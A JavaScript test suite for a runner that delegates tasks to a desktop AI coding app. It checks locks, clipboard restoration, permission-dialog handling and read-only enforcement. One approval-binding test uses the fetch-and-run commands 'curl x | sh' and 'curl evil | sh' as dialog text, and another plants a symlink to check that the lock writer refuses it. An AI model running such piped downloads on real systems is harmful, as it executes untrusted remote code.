import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import test from 'node:test';

import { acquireLock } from '../../scripts/desktop.mjs';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const RUNNER = join(ROOT, 'scripts', 'desktop.mjs');
const FAKE = join(ROOT, 'tests', 'fixtures', 'fake-desktop-bridge.mjs');

function git(cwd, ...args) {
  const result = spawnSync('git', ['-c', 'user.email=t@example.com', '-c', 'user.name=t', ...args], { cwd, encoding: 'utf8' });
  assert.equal(result.status, 0, result.stderr);
}

function setup(state = {}, { project = 'ws', projects = [project] } = {}) {
  const cwd = mkdtempSync(join(tmpdir(), 'agybird-dr-ws-'));
  git(cwd, 'init', '-q');
  writeFileSync(join(cwd, 'README.md'), 'hello\n');
  git(cwd, 'add', '.');
  git(cwd, 'commit', '-q', '-m', 'init');
  const projectsDir = mkdtempSync(join(tmpdir(), 'agybird-dr-projects-'));
  projects.forEach((name, index) => {
    writeFileSync(join(projectsDir, `p${index}.json`), JSON.stringify({ id: `p${index}`, name, projectResources: { resources: [{ gitFolder: { folderUri: pathToFileURL(cwd).href } }] } }));
  });
  const stateFile = join(mkdtempSync(join(tmpdir(), 'agybird-dr-fake-')), 'state.json');
  writeFileSync(stateFile, JSON.stringify(state));
  const stateDir = mkdtempSync(join(tmpdir(), 'agybird-dr-state-'));
  const env = {
    ...process.env,
    AGYBIRD_DESKTOP_BRIDGE: FAKE,
    AGYBIRD_FAKE_DESKTOP_STATE: stateFile,
    AGYBIRD_PROJECTS_DIR: projectsDir,
    AGYBIRD_STATE_DIR: stateDir,
    AGYBIRD_DESKTOP_POLL_MS: '10',
  };
  return { cwd, env, stateDir, fake: () => JSON.parse(readFileSync(stateFile, 'utf8')) };
}

function start(context, args = [], prompt = 'Say READY.') {
  const child = spawn(process.execPath, [RUNNER, '--category', 'code', '--cwd', context.cwd, ...args], { env: context.env, stdio: ['pipe', 'pipe', 'pipe'] });
  child.stdin.end(prompt);
  const done = new Promise((resolve) => {
    let stdout = '';
    let stderr = '';
    child.stdout.setEncoding('utf8').on('data', (chunk) => { stdout += chunk; });
    child.stderr.setEncoding('utf8').on('data', (chunk) => { stderr += chunk; });
    child.on('close', (code) => resolve({ code, stderr, envelope: JSON.parse(stdout.trim().split('\n').pop()) }));
  });
  return { child, done };
}

const run = (context, args, prompt) => start(context, args, prompt).done;
const names = (context) => (context.fake().calls ?? []).map((call) => call[0]);

function assertCleanedUp(context) {
  const fake = context.fake();
  assert.equal(fake.clipboard, 'user clipboard', 'clipboard restored');
  assert.equal(fake.frontmost, 'com.example.host', 'frontmost app restored');
  assert.equal(existsSync(join(context.stateDir, 'desktop.lock')), false, 'lock released');
}

test('a read task runs in a new conversation of the workspace project and returns the reply', async () => {
  const context = setup({ runningPolls: 2, reply: 'READY' });
  const { code, envelope } = await run(context);
  assert.equal(code, 0);
  assert.equal(envelope.status, 'success');
  assert.equal(envelope.response, 'READY');
  assert.deepEqual(envelope.evidence, { transport: 'desktop', app_version: '2.35.2', preset: 'Request Review', session_resumed: false, changed_files: [], conversation_title: 'Fake Task - ws - Antigravity' });
  const calls = context.fake().calls;
  assert.deepEqual(calls.find((call) => call[0] === 'new-conversation'), ['new-conversation', 'ws']);
  const order = names(context);
  for (const [before, after] of [['front', 'new-conversation'], ['new-conversation', 'paste-input'], ['paste-input', 'send'], ['send', 'restore']]) {
    assert.ok(order.indexOf(before) < order.indexOf(after), `${before} before ${after}`);
  }
  assert.ok(!order.includes('answer') && !order.includes('stop'));
  assertCleanedUp(context);
});

test('the prompt pasted is the delegated task, wrapped like the CLI runner\'s', async () => {
  const context = setup();
  assert.equal((await run(context, [], 'Explain README.md.')).envelope.status, 'success');
  const [pasted] = context.fake().clipboardWrites;
  assert.match(pasted, /<agybird_user_task>\nExplain README\.md\.\n<\/agybird_user_task>/);
  assert.match(pasted, /Do not create, edit, move, or delete files/);
});

test('preflight blocks with a specific reason and leaves no lock', async () => {
  const cases = [
    [{ trusted: false }, {}, 'not_trusted'],
    [{ version: '2.40.0' }, {}, 'unsupported_version'],
    [{ missingLabel: 'Select model' }, {}, 'labels_missing'],
    [{}, { projects: [] }, 'no_project'],
    [{}, { projects: ['ws', 'ws'] }, 'ambiguous_project'],
  ];
  for (const [state, projectOptions, reason] of cases) {
    const context = setup(state, projectOptions);
    const { code, envelope } = await run(context);
    assert.equal(envelope.status, 'blocked', reason);
    assert.equal(envelope.evidence.blocked_reason, reason);
    assert.equal(code, 0, `${reason}: blocked exits 0, as the CLI runner does`);
    assert.ok(!names(context).includes('send'), reason);
    assert.equal(existsSync(join(context.stateDir, 'desktop.lock')), false, reason);
  }
});

test('an app version outside the tested range runs when the user confirmed it', async () => {
  const context = setup({ version: '2.40.0' });
  context.env.AGYBIRD_DESKTOP_ALLOW_VERSION = '1';
  assert.equal((await run(context)).envelope.status, 'success');
});

test('another desktop run holding the lock blocks the run', async () => {
  const context = setup();
  writeFileSync(join(context.stateDir, 'desktop.lock'), String(process.pid));
  const { envelope } = await run(context);
  assert.equal(envelope.evidence.blocked_reason, 'locked');
  assert.equal(readFileSync(join(context.stateDir, 'desktop.lock'), 'utf8'), String(process.pid));
});

test('a lock left by a process that is gone is taken over', async () => {
  const context = setup();
  writeFileSync(join(context.stateDir, 'desktop.lock'), '999999999');
  assert.equal((await run(context)).envelope.status, 'success');
});

test('every preset is accepted as it is; Auto and Turbo add a warning', async () => {
  for (const preset of ['Request Review', 'Default', 'Auto', 'Turbo']) {
    const context = setup({ preset });
    const { envelope } = await run(context);
    assert.equal(envelope.status, 'success', preset);
    assert.equal(envelope.evidence.preset, preset);
    const warned = envelope.warnings.some((warning) => /without asking/.test(warning));
    assert.equal(warned, preset === 'Auto' || preset === 'Turbo', preset);
  }
});

test('read mode turns a working-tree change into an error', async () => {
  const context = setup();
  writeFileSync(context.env.AGYBIRD_FAKE_DESKTOP_STATE, JSON.stringify({ onSend: { path: join(context.cwd, 'new.txt'), content: 'x' } }));
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.deepEqual(envelope.evidence.changed_files, ['new.txt']);
  assert.ok(envelope.warnings.some((warning) => /read mode/.test(warning)));
});

test('read mode sees a change to a dirty file past the first 500', async () => {
  const context = setup();
  for (let index = 0; index < 600; index += 1) writeFileSync(join(context.cwd, `f${String(index).padStart(3, '0')}.txt`), 'before\n');
  writeFileSync(context.env.AGYBIRD_FAKE_DESKTOP_STATE, JSON.stringify({ onSend: { path: join(context.cwd, 'f599.txt'), content: 'after\n' } }));
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.deepEqual(envelope.evidence.changed_files, ['f599.txt']);
});

test('write mode reports the files the run changed', async () => {
  const context = setup();
  writeFileSync(context.env.AGYBIRD_FAKE_DESKTOP_STATE, JSON.stringify({ onSend: { path: join(context.cwd, 'README.md'), content: 'changed\n' } }));
  const { envelope } = await run(context, ['--mode', 'write']);
  assert.equal(envelope.status, 'success');
  assert.deepEqual(envelope.evidence.changed_files, ['README.md']);
});

test('a permission dialog yields needs_permission and the run cleans up', async () => {
  const context = setup({ runningPolls: 1, dialog: { question: 'Allow list directory contents?', options: ['1 Yes, allow this time', "2 Yes, and always allow 'ls' in this conversation", "3 Yes, and always allow 'ls'", '4 No (tell the agent what to do instead)'] } });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'needs_permission');
  assert.equal(envelope.permission_requests.length, 1);
  const [request] = envelope.permission_requests;
  assert.equal(request.question, 'Allow list directory contents?');
  assert.equal(request.scope, 'ls');
  assert.equal(request.options.length, 4);
  assert.equal(request.grantable, false);
  assert.ok(!names(context).includes('answer'));
  assertCleanedUp(context);
});

test('a run past its deadline is stopped and reported as an error', async () => {
  const context = setup({ stuck: true });
  const { envelope } = await run(context, ['--timeout', '300ms']);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /timed out/.test(warning)));
  assert.ok(names(context).includes('stop'));
  assert.ok(!names(context).includes('answer'));
  assertCleanedUp(context);
});

test('a paste that reads back differently is cleared and never sent', async () => {
  const context = setup({ paste: 'something else' });
  const { code, envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.equal(code, 1, 'only error exits 1');
  assert.ok(names(context).includes('clear-input'));
  assert.ok(!names(context).includes('send'));
  assertCleanedUp(context);
});

test('SIGTERM stops the run in the app and cleans up', { skip: process.platform === 'win32' }, async () => {
  const context = setup({ stuck: true });
  const { child, done } = start(context);
  // Once the run polls, Send has returned and bound the conversation.
  while (!names(context).slice(names(context).indexOf('send') + 1).includes('snapshot') || !names(context).includes('send')) await new Promise((resolve) => setTimeout(resolve, 20));
  child.kill('SIGTERM');
  const { envelope } = await done;
  assert.equal(envelope.status, 'error');
  assert.equal(context.fake().stopped, true);
  assert.ok(envelope.warnings.some((warning) => /cancelled and stopped/.test(warning)));
  assertCleanedUp(context);
});

const waitFor = async (context, command) => {
  while (!names(context).includes(command)) await new Promise((resolve) => setTimeout(resolve, 20));
};
const lockFile = (context) => join(context.stateDir, 'desktop.lock');

test('a SIGTERM before the conversation title is known says stopped only when Stop was pressed', { skip: process.platform === 'win32' }, async () => {
  const context = setup({ stuck: true, sendReturnsNoTitle: true });
  context.env.AGYBIRD_DESKTOP_POLL_MS = '5000';
  const { child, done } = start(context);
  await waitFor(context, 'send');
  await new Promise((resolve) => setTimeout(resolve, 200));
  child.kill('SIGTERM');
  const { envelope } = await done;
  assert.equal(envelope.status, 'error');
  assert.notEqual(context.fake().stopped, true, 'Stop was refused in the titled conversation');
  assert.ok(!envelope.warnings.some((warning) => /stopped in the app/.test(warning)), envelope.warnings.join(' | '));
  assert.ok(envelope.warnings.some((warning) => /may still be going/.test(warning)));
  // The app may still run, so the lock stays until the run's deadline.
  assert.equal(JSON.parse(readFileSync(lockFile(context), 'utf8')).app, true);
  assert.equal(context.fake().clipboard, 'user clipboard');
});

test('a bridge failure after Send presses Stop in the run\'s conversation before the lock is released', async () => {
  const context = setup({ stuck: true, failSnapshotAfterSend: true });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.equal(context.fake().stopped, true);
  assert.deepEqual(context.fake().calls.find((call) => call[0] === 'stop'), ['stop', TITLE]);
  assertCleanedUp(context);
});

test('when Stop cannot be pressed after a failure, the run says the app may still run and keeps the lock', async () => {
  const context = setup({ stuck: true, failSnapshotAfterSend: true, stopFails: true });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /may still be going/.test(warning)));
  assert.equal(existsSync(lockFile(context)), true);
  const next = setup();
  next.env.AGYBIRD_STATE_DIR = context.stateDir;
  assert.equal((await run(next)).envelope.evidence.blocked_reason, 'locked');
});

test('a cancel during the paste clears the composer and restores everything without waiting for the paste', { skip: process.platform === 'win32' }, async () => {
  const context = setup({ delays: { 'paste-input': 20_000 } });
  const { child, done } = start(context);
  await waitFor(context, 'paste-input');
  const started = Date.now();
  child.kill('SIGTERM');
  const { envelope } = await done;
  assert.ok(Date.now() - started < 10_000, 'the paste was interrupted');
  assert.equal(envelope.status, 'error');
  assert.equal(context.fake().cleared, true);
  assert.ok(!names(context).includes('send'));
  assertCleanedUp(context);
});

test('options the desktop transport cannot honour are refused before the app is touched', async () => {
  for (const args of [['--model', 'x'], ['--swarm', '--new-session'], ['--conversation', 'c1'], ['--effort', 'high']]) {
    const context = setup();
    const { envelope } = await run(context, args);
    assert.equal(envelope.status, 'error', args[0]);
    assert.match(envelope.warnings[0], new RegExp(args[0]));
    assert.equal(context.fake().calls, undefined, args[0]);
  }
});

test('with --json-schema the last fenced JSON block of the reply is the structured output', async () => {
  const context = setup({ reply: 'Findings below.\n```json\n{"verdict": "approve", "findings": []}\n```' });
  const schema = join(mkdtempSync(join(tmpdir(), 'agybird-dr-schema-')), 'schema.json');
  mkdirSync(dirname(schema), { recursive: true });
  writeFileSync(schema, JSON.stringify({ type: 'object', required: ['verdict', 'findings'] }));
  const { envelope } = await run(context, ['--json-schema', schema]);
  assert.equal(envelope.status, 'success');
  assert.deepEqual(envelope.structured_output, { verdict: 'approve', findings: [] });

  const missing = setup({ reply: 'No block here.' });
  assert.equal((await run(missing, ['--json-schema', schema])).envelope.status, 'error');
});

const DIALOG = { question: 'Allow list directory contents?', options: ['1 Yes, allow this time', "2 Yes, and always allow 'ls' in this conversation", "3 Yes, and always allow 'ls'", '4 No (tell the agent what to do instead)'] };
const TITLE = 'Fake Task - ws - Antigravity';

test('read mode declines a permission prompt when the run already changed the working tree', async () => {
  const context = setup();
  writeFileSync(context.env.AGYBIRD_FAKE_DESKTOP_STATE, JSON.stringify({ dialog: DIALOG, onSend: { path: join(context.cwd, 'new.txt'), content: 'x' } }));
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.deepEqual(envelope.evidence.changed_files, ['new.txt']);
  assert.deepEqual(envelope.permission_requests, []);
  const answers = context.fake().calls.filter((call) => call[0] === 'answer');
  assert.deepEqual(answers.map((call) => call[1]), ['Skip']);
  assertCleanedUp(context);
});

test('write mode reports what changed before a permission prompt', async () => {
  const context = setup();
  writeFileSync(context.env.AGYBIRD_FAKE_DESKTOP_STATE, JSON.stringify({ dialog: DIALOG, onSend: { path: join(context.cwd, 'README.md'), content: 'edited\n' } }));
  const { envelope } = await run(context, ['--mode', 'write']);
  assert.equal(envelope.status, 'needs_permission');
  assert.deepEqual(envelope.evidence.changed_files, ['README.md']);
  assert.equal(envelope.evidence.conversation_title, TITLE);
});

test('the clipboard is put back before Send, with its own markers, and lost non-text content is reported', async () => {
  const context = setup({ runningPolls: 1, clipboardMarkers: ['org.nspasteboard.ConcealedType'], clipboardOther: true });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success');
  const order = names(context);
  assert.ok(order.indexOf('clipboard-restore') > order.indexOf('paste-input'), 'restored after the paste');
  assert.ok(order.indexOf('clipboard-restore') < order.indexOf('send'), 'restored before Send');
  assert.deepEqual(context.fake().restoredMarkers, ['org.nspasteboard.ConcealedType']);
  assert.ok(envelope.warnings.some((warning) => /only its text/.test(warning)));
  assertCleanedUp(context);
});

test('a Copy that leaves the clipboard unchanged falls back to the on-screen reply, never the user clipboard', async () => {
  const context = setup({ copyNoop: true, reply: 'on screen' });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success');
  assert.equal(envelope.response, 'on screen');
  assert.ok(envelope.warnings.some((warning) => /could not be copied/.test(warning)));
  assertCleanedUp(context);
});

test('the run stops reading, and presses nothing, once the app shows another conversation', async () => {
  const context = setup({ runningPolls: 5, switchAfter: 1 });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /another conversation/.test(warning)));
  assert.ok(!names(context).includes('stop'));
  assert.ok(!names(context).includes('copy-reply'));
  // The run's own conversation may still be going, so the lock stays and says so.
  assert.ok(envelope.warnings.some((warning) => /may still be going/.test(warning)));
  assert.equal(JSON.parse(readFileSync(join(context.stateDir, 'desktop.lock'), 'utf8')).app, true);
  assert.equal(context.fake().clipboard, 'user clipboard');
  assert.equal(context.fake().frontmost, 'com.example.host');
});

test('a switch to another conversation while the run\'s is still untitled ends as error, with nothing pressed', async () => {
  const context = setup({ untitledPolls: 2, switchWhileUntitled: true, runningPolls: 3 });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.equal(envelope.response, null);
  assert.equal(envelope.evidence.conversation_title, undefined);
  for (const command of ['copy-reply', 'answer', 'stop']) assert.ok(!names(context).includes(command), command);
  assert.equal(context.fake().stopped, undefined);
});

test('a conversation the user opens while the app names the run\'s is never adopted', async () => {
  const context = setup({ switchDuringNaming: 'Other Chat', runningPolls: 3, reply: 'the other conversation\'s reply' });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.equal(envelope.response, null);
  assert.equal(envelope.evidence.conversation_title, undefined);
  assert.ok(envelope.warnings.some((warning) => /could not tie/.test(warning)), envelope.warnings.join(' | '));
  for (const command of ['copy-reply', 'answer', 'stop']) assert.ok(!names(context).includes(command), command);
  assert.equal(context.fake().stopped, undefined);
});

test('the conversation title is taken from the Send call, so a late title is never adopted', async () => {
  const late = setup({ untitledPolls: 2, runningPolls: 3 });
  const { envelope } = await run(late);
  assert.equal(envelope.status, 'error');
  assert.ok(!names(late).includes('copy-reply'));
  assert.deepEqual(late.fake().calls.find((call) => call[0] === 'send'), ['send', 'Antigravity', 'ws']);
});

test('paste and send are refused once the app no longer shows the new conversation', async () => {
  const context = setup({ titleBeforeSend: 'Other Chat - ws - Antigravity' });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(!names(context).includes('send'));
  assert.equal(context.fake().sent, undefined);
});

test('a successful run names the conversation it read', async () => {
  const context = setup({ runningPolls: 1 });
  assert.equal((await run(context)).envelope.evidence.conversation_title, TITLE);
});

test('a resumed run waits for the new turn instead of returning the reply already on screen', async () => {
  const context = setup({ sent: true, project: 'ws', dialog: DIALOG, replyBeforeDialog: 'checking the folder', lag: 1, runningPolls: 2, reply: 'final answer' });
  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE]);
  assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
  assert.equal(envelope.response, 'final answer');
});

test('a resumed run answers nothing when the app shows another conversation or another option 1', async () => {
  const other = setup({ sent: true, project: 'ws', dialog: DIALOG, title: 'Other Chat - ws - Antigravity' });
  assert.equal((await run(other, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE])).envelope.status, 'error');
  assert.ok(!names(other).includes('answer'));
  const reordered = setup({ sent: true, project: 'ws', dialog: { ...DIALOG, options: ["1 Yes, and always allow 'ls'", ...DIALOG.options.slice(1)] } });
  const { envelope } = await run(reordered, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE]);
  assert.equal(envelope.status, 'error');
  assert.equal(reordered.fake().answered, undefined);
});

test('a lock being written, or still within its time, is held; one past its time is taken over', async () => {
  const fresh = setup();
  writeFileSync(join(fresh.stateDir, 'desktop.lock'), '');
  assert.equal((await run(fresh)).envelope.evidence.blocked_reason, 'locked');
  const expired = setup();
  writeFileSync(join(expired.stateDir, 'desktop.lock'), JSON.stringify({ pid: process.pid, expiresAt: Date.now() - 1 }));
  assert.equal((await run(expired)).envelope.status, 'success');
  assert.equal(existsSync(join(expired.stateDir, 'desktop.lock')), false);
});

test('three runs taking over one stale lock leave exactly one live holder', async () => {
  const path = join(mkdtempSync(join(tmpdir(), 'agybird-dr-lock-')), 'desktop.lock');
  const expiresAt = Date.now() + 60_000;
  writeFileSync(path, JSON.stringify({ pid: 999999999, expiresAt }));
  const sleeper = spawn(process.execPath, ['-e', 'setInterval(() => {}, 1000)'], { stdio: 'ignore' });
  const [a, b, c] = [process.pid, process.ppid, sleeper.pid];
  const holders = [];
  const attempt = (pid, hooks) => {
    try {
      acquireLock(path, expiresAt, { pid, hooks });
      holders.push(pid);
    } catch (error) {
      if (error.reason !== 'locked') throw error;
    }
  };
  try {
    // B has read the stale lock; A takes it over meanwhile, and C arrives once B has moved A's lock aside.
    attempt(b, { stale: () => attempt(a), aside: () => attempt(c) });
    attempt(c);
  } finally {
    sleeper.kill();
  }
  assert.equal(holders.length, 1, `runs that believe they hold the lock: ${holders.join(', ')}`);
  assert.equal(JSON.parse(readFileSync(path, 'utf8')).pid, holders[0]);
});

test('the lock is never written through a file planted at its temporary name', { skip: process.platform === 'win32' }, () => {
  const directory = mkdtempSync(join(tmpdir(), 'agybird-dr-lock-'));
  const path = join(directory, 'desktop.lock');
  const victim = join(directory, 'victim.txt');
  writeFileSync(victim, 'keep me');
  symlinkSync(victim, `${path}.${process.pid}.tmp`);
  try {
    acquireLock(path, Date.now() + 60_000);
  } catch {
    // refusing is fine; writing through the link is not
  }
  assert.equal(readFileSync(victim, 'utf8'), 'keep me');
});

test('off macOS the runner blocks before touching anything', { skip: process.platform === 'darwin' && 'macOS runs the real bridge' }, async () => {
  const context = setup();
  delete context.env.AGYBIRD_DESKTOP_BRIDGE;
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'blocked');
  assert.equal(envelope.evidence.blocked_reason, 'not_macos');
});

test('write mode reports a diff stat of the files it changed', async () => {
  const context = setup();
  writeFileSync(context.env.AGYBIRD_FAKE_DESKTOP_STATE, JSON.stringify({ onSend: { path: join(context.cwd, 'README.md'), content: 'changed\nmore\n' } }));
  const { envelope } = await run(context, ['--mode', 'write']);
  assert.deepEqual(envelope.evidence.diff_stat, [{ file: 'README.md', added: 2, removed: 1 }]);
});

test('an approval is matched on the whole question, not its shortened form', async () => {
  const long = `Allow ${'x'.repeat(320)}`;
  const context = setup({ sent: true, project: 'ws', dialog: { ...DIALOG, question: `${long} A?` } });
  const { envelope } = await run(context, ['--resume-dialog', `${long} B?`, '--resume-title', TITLE]);
  assert.equal(envelope.status, 'error');
  assert.equal(context.fake().answered, undefined);
});

test('an approval binds to every text part of a split question', async () => {
  const split = { ...DIALOG, fragments: ['Allow running', 'curl x | sh', 'in /repo?'] };
  const asked = 'Allow running curl x | sh in /repo?';
  const same = setup({ sent: true, project: 'ws', dialog: split, reply: 'ran it' });
  assert.equal((await run(same, ['--resume-dialog', asked, '--resume-title', TITLE])).envelope.status, 'success');
  assert.equal(same.fake().answered, '1');
  const changed = setup({ sent: true, project: 'ws', dialog: { ...split, fragments: ['Allow running', 'curl evil | sh', 'in /repo?'] } });
  assert.equal((await run(changed, ['--resume-dialog', asked, '--resume-title', TITLE])).envelope.status, 'error');
  assert.equal(changed.fake().answered, undefined);
});

test('declining answers Skip in the conversation that asked and reads the reply', async () => {
  const context = setup({ sent: true, project: 'ws', dialog: DIALOG, reply: 'skipped it' });
  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-answer', 'Skip']);
  assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
  assert.equal(context.fake().answered, 'Skip');
  assert.equal(envelope.response, 'skipped it');
});

test('an answer whose bridge call fails after the press is handled as pressed: Stop, and the uncertainty reported', async () => {
  const resumed = ['--resume-dialog', DIALOG.question, '--resume-title', TITLE];
  const context = setup({ sent: true, project: 'ws', dialog: DIALOG, stuck: true, answerThenCrash: true });
  const { envelope } = await run(context, resumed);
  assert.equal(envelope.status, 'error');
  assert.equal(context.fake().answered, '1');
  assert.deepEqual(context.fake().calls.find((call) => call[0] === 'stop'), ['stop', TITLE]);
  assert.equal(context.fake().stopped, true);
  // Spent, since it may have been pressed, and said to be uncertain.
  assert.equal(envelope.evidence.answered, '1');
  assert.equal(envelope.evidence.answer_uncertain, true);
  assert.ok(envelope.warnings.some((warning) => /may have been pressed/.test(warning)), envelope.warnings.join(' | '));
  assert.equal(existsSync(lockFile(context)), false);

  const unstoppable = setup({ sent: true, project: 'ws', dialog: DIALOG, stuck: true, answerThenCrash: true, stopFails: true });
  const kept = await run(unstoppable, resumed);
  assert.ok(kept.envelope.warnings.some((warning) => /may still be going/.test(warning)));
  assert.deepEqual(JSON.parse(readFileSync(lockFile(unstoppable), 'utf8')).conversation, TITLE);
  assert.equal(JSON.parse(readFileSync(lockFile(unstoppable), 'utf8')).app, true);
});

test('an answer refused before any press is not spent and stops nothing', async () => {
  const context = setup({ sent: true, project: 'ws', dialog: { ...DIALOG, options: ["1 Yes, and always allow 'ls'", ...DIALOG.options.slice(1)] } });
  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE]);
  assert.equal(envelope.status, 'error');
  assert.equal(envelope.evidence.answered, undefined);
  assert.ok(!names(context).includes('stop'));
  assert.equal(existsSync(lockFile(context)), false);
});

// A lock kept for an app task by a run that is gone (its pid is not running).
const appLock = (context, expiresAt) => writeFileSync(lockFile(context), JSON.stringify({ pid: 999999999, expiresAt, app: true, conversation: TITLE }));

test('a kept app lock past its time still refuses a run while its conversation shows a run', async () => {
  const context = setup({ earlier: { title: TITLE, running: true } });
  appLock(context, Date.now() - 1);
  const { envelope } = await run(context);
  assert.equal(envelope.evidence.blocked_reason, 'locked');
  assert.ok(envelope.warnings.some((warning) => warning.includes(lockFile(context))), envelope.warnings.join(' | '));
  assert.ok(!names(context).includes('send'));
  assert.equal(JSON.parse(readFileSync(lockFile(context), 'utf8')).app, true);
});

test('a kept app lock is released once the app shows its conversation with no run', async () => {
  const context = setup({ earlier: { title: TITLE, running: false } });
  appLock(context, Date.now() + 60 * 60_000);
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
  assertCleanedUp(context);
  // Another conversation on screen is no evidence either way.
  const other = setup({ earlier: { title: 'Other Chat - ws - Antigravity', running: false } });
  appLock(other, Date.now() - 1);
  assert.equal((await run(other)).envelope.evidence.blocked_reason, 'locked');
});

test('a stalled Stop finds the app lock already kept, and cleanup ends on its own within the grace', { skip: process.platform === 'win32' }, async () => {
  const context = setup({ stuck: true, delays: { stop: 60_000 } });
  const { child, done } = start(context);
  while (!names(context).includes('send') || !names(context).slice(names(context).indexOf('send') + 1).includes('snapshot')) await new Promise((resolve) => setTimeout(resolve, 20));
  const started = Date.now();
  child.kill('SIGTERM');
  await waitFor(context, 'stop');
  // Were the runner killed now, while Stop stalls, the lock must already say the app may run.
  const kept = JSON.parse(readFileSync(lockFile(context), 'utf8'));
  assert.equal(kept.app, true);
  assert.equal(kept.conversation, TITLE);
  const { envelope } = await done;
  assert.ok(Date.now() - started < 12_000, `cleanup took ${Date.now() - started} ms`);
  assert.ok(envelope.warnings.some((warning) => /may still be going/.test(warning)));
  assert.equal(JSON.parse(readFileSync(lockFile(context), 'utf8')).app, true);
  assert.equal(context.fake().clipboard, 'user clipboard');
  assert.equal(context.fake().frontmost, 'com.example.host');
});
